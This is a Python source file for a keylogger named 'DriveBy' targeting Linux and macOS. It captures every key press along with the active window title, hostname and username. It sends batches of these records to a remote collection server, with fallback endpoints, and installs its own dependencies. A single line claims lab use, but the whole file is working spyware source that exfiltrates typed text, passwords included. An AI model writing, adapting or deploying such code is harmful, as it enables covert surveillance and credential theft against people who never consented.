#!/usr/bin/env python3
"""
DriveBy Linux/Mac Keystroke/Activity Monitor
Python script for observing keyboard activity on Unix-like systems (best-effort).
- Uses pynput when available for key press callbacks
- Falls back to observing active window changes as "activity"
Note: Intended for controlled/lab environments with appropriate permissions.
"""

import os
import sys
import time
import json
import socket
import platform
import subprocess
from datetime import datetime
from typing import Any, Dict, List, Optional

import requests

try:
    from pynput import keyboard  # type: ignore
    PYNPUT_AVAILABLE = True
except Exception:
    PYNPUT_AVAILABLE = False
    print("pynput not available; will use alternative monitoring method")


class LinuxKeystrokeMonitor:
    def __init__(self, server_ip: str = "192.168.43.1", server_port: int = 8081):
        self.server_ip = server_ip
        self.server_port = server_port
        self.server_url = f"http://{server_ip}:{server_port}/collect"
        self.keystroke_buffer: List[Dict[str, Any]] = []
        self.running = True
        self.last_send = time.time()
        self.client_info = self.get_client_info()

        # Optional multi-endpoint support (primary first, then backups)
        self.remote_endpoints: List[str] = [self.server_url]
        self.current_endpoint_index = 0

    # ----------------------
    # System Info
    # ----------------------
    def get_client_info(self) -> Dict[str, Any]:
        """Get client system information."""
        try:
            return {
                "hostname": socket.gethostname(),
                "username": os.getenv("USER", "unknown"),
                "os": platform.system(),
                "os_version": platform.release(),
                "architecture": platform.machine(),
                "python_version": platform.python_version(),
                "timestamp": datetime.now().isoformat(),
            }
        except Exception as e:
            print(f"Error getting client info: {e}")
            return {"error": str(e)}

    # ----------------------
    # Keyboard callbacks
    # ----------------------
    def on_key_press(self, key) -> None:
        """Handle key press events (pynput callback)."""
        try:
            timestamp = datetime.now().isoformat()

            # Extract key info
            if hasattr(key, "char") and key.char is not None:
                key_label = key.char
                key_type = "char"
            else:
                key_label = str(key)
                key_type = "special"

            key_info = {
                "timestamp": timestamp,
                "key": key_label,
                "key_type": key_type,
                "event": "press",
            }

            # Add window info if available
            try:
                active_window = self.get_active_window()
                if active_window:
                    key_info["window"] = active_window
            except Exception:
                pass

            self.keystroke_buffer.append(key_info)

            # Send data if buffer is full or time threshold reached
            current_time = time.time()
            if len(self.keystroke_buffer) >= 50 or (current_time - self.last_send) >= 30:
                self.send_keystroke_data()
        except Exception as e:
            print(f"Error processing key press: {e}")

    # ----------------------
    # Active window helper
    # ----------------------
    def get_active_window(self) -> Optional[str]:
        """Get active window/application title (best-effort)."""
        try:
            system = platform.system()
            if system == "Linux":
                # Try xdotool
                result = subprocess.run(
                    ["xdotool", "getactivewindow", "getwindowname"],
                    capture_output=True,
                    text=True,
                    timeout=2,
                )
                if result.returncode == 0 and result.stdout.strip():
                    return result.stdout.strip()

                # Try wmctrl -l (list windows) and attempt to find a focused one (heuristic)
                result = subprocess.run(
                    ["wmctrl", "-l"],
                    capture_output=True,
                    text=True,
                    timeout=2,
                )
                if result.returncode == 0 and result.stdout.strip():
                    # Heuristic: return last window title line (not exact active)
                    lines = [ln for ln in result.stdout.splitlines() if ln.strip()]
                    if lines:
                        return lines[-1].split(None, 3)[-1].strip()

            elif system == "Darwin":  # macOS
                script = 'tell application "System Events" to get name of first application process whose frontmost is true'
                result = subprocess.run(["osascript", "-e", script], capture_output=True, text=True, timeout=2)
                if result.returncode == 0 and result.stdout.strip():
                    return result.stdout.strip()
        except Exception:
            pass

        return None

    # ----------------------
    # Networking
    # ----------------------
    def send_keystroke_data(self) -> None:
        """Send keystroke data to server with endpoint fallback."""
        if not self.keystroke_buffer:
            return

        data = {
            "client_info": self.client_info,
            "keystrokes": self.keystroke_buffer.copy(),
            "batch_info": {
                "count": len(self.keystroke_buffer),
                "start_time": self.keystroke_buffer[0]["timestamp"] if self.keystroke_buffer else None,
                "end_time": self.keystroke_buffer[-1]["timestamp"] if self.keystroke_buffer else None,
            },
        }

        sent = False
        for attempt, endpoint in enumerate(self.remote_endpoints):
            try:
                response = requests.post(
                    endpoint,
                    json=data,
                    timeout=10,
                    headers={"Content-Type": "application/json"},
                )
                if response.status_code == 200:
                    print(f"Sent {len(self.keystroke_buffer)} keystrokes to {endpoint}")
                    self.keystroke_buffer.clear()
                    self.last_send = time.time()
                    # Move successful endpoint to the front
                    if attempt > 0:
                        self.remote_endpoints.insert(0, self.remote_endpoints.pop(attempt))
                    sent = True
                    break
                else:
                    print(f"Endpoint {endpoint} responded with status: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"Error sending to {endpoint}: {e}")
                continue
            except Exception as e:
                print(f"Unexpected error with {endpoint}: {e}")
                continue

        if not sent:
            print("Failed to send data to any endpoint")

    # ----------------------
    # Alternative strategy if pynput missing
    # ----------------------
    def alternative_monitor(self) -> None:
        """Alternative monitoring when pynput is unavailable: observe active window changes."""
        print("Using alternative monitoring method (active window changes)...")
        last_window: Optional[str] = None

        while self.running:
            try:
                current_window = self.get_active_window()
                if current_window and current_window != last_window:
                    keystroke_info = {
                        "timestamp": datetime.now().isoformat(),
                        "event": "window_change",
                        "window": current_window,
                        "key_type": "system",
                    }
                    self.keystroke_buffer.append(keystroke_info)
                    last_window = current_window

                # Periodic send
                if time.time() - self.last_send >= 30:
                    self.send_keystroke_data()

                time.sleep(1)
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"Error in alternative monitor: {e}")
                time.sleep(5)

    # ----------------------
    # Utilities
    # ----------------------
    def install_dependencies(self) -> bool:
        """Try to install required dependencies (pynput)."""
        try:
            print("Attempting to install pynput...")
            subprocess.run([sys.executable, "-m", "pip", "install", "pynput"], check=True, capture_output=True)
            print("pynput installed successfully")
            return True
        except subprocess.CalledProcessError:
            print("Failed to install pynput")
            return False
        except Exception as e:
            print(f"Error installing dependencies: {e}")
            return False

    def check_permissions(self) -> bool:
        """Check for basic permissions on Linux input devices (best-effort)."""
        if platform.system() == "Linux":
            try:
                dev_input = "/dev/input"
                if os.path.isdir(dev_input):
                    for name in os.listdir(dev_input):
                        if name.startswith("event"):
                            path = os.path.join(dev_input, name)
                            if os.access(path, os.R_OK):
                                print(f"Have read access to {path}")
                                return True
            except Exception:
                pass
            print("No read access to /dev/input events detected (root may be required).")
        return False

    # ----------------------
    # Control
    # ----------------------
    def start_monitoring(self) -> None:
        """Start keystroke/behavior monitoring."""
        print("DriveBy Linux/Mac Monitor Starting...")
        print(f"Server: {self.server_url}")
        print(f"Client: {self.client_info.get('hostname', 'unknown')}")
        print(f"OS: {self.client_info.get('os', 'unknown')} {self.client_info.get('os_version', '')}")

        # Permissions check (informational)
        self.check_permissions()

        if PYNPUT_AVAILABLE:
            try:
                print("Starting pynput keyboard listener...")
                with keyboard.Listener(on_press=self.on_key_press) as listener:  # type: ignore
                    # Send initial info (empty buffer ok)
                    self.send_keystroke_data()
                    listener.join()
            except Exception as e:
                print(f"Error with pynput listener: {e}")
                print("Falling back to alternative method...")
                self.alternative_monitor()
        else:
            # Attempt to install then advise restart, else fallback
            if self.install_dependencies():
                print("pynput installed. Please restart the script to enable key monitoring.")
            print("Using alternative monitoring method...")
            self.alternative_monitor()

    def stop_monitoring(self) -> None:
        """Stop monitoring and send remaining data."""
        print("Stopping monitor...")
        self.running = False
        if self.keystroke_buffer:
            self.send_keystroke_data()
        print("Monitor stopped.")


def main() -> None:
    """Main entry point."""
    import argparse

    parser = argparse.ArgumentParser(description="DriveBy Linux/Mac Keystroke Monitor")
    parser.add_argument("--server", default="192.168.43.1", help="Server IP address")
    parser.add_argument("--port", type=int, default=8081, help="Server port")
    parser.add_argument("--install-deps", action="store_true", help="Install dependencies and exit")

    args = parser.parse_args()

    if args.install_deps:
        monitor = LinuxKeystrokeMonitor()
        monitor.install_dependencies()
        return

    monitor = LinuxKeystrokeMonitor(args.server, args.port)
    try:
        monitor.start_monitoring()
    except KeyboardInterrupt:
        print("\nReceived interrupt signal...")
    finally:
        monitor.stop_monitoring()


if __name__ == "__main__":
    main()
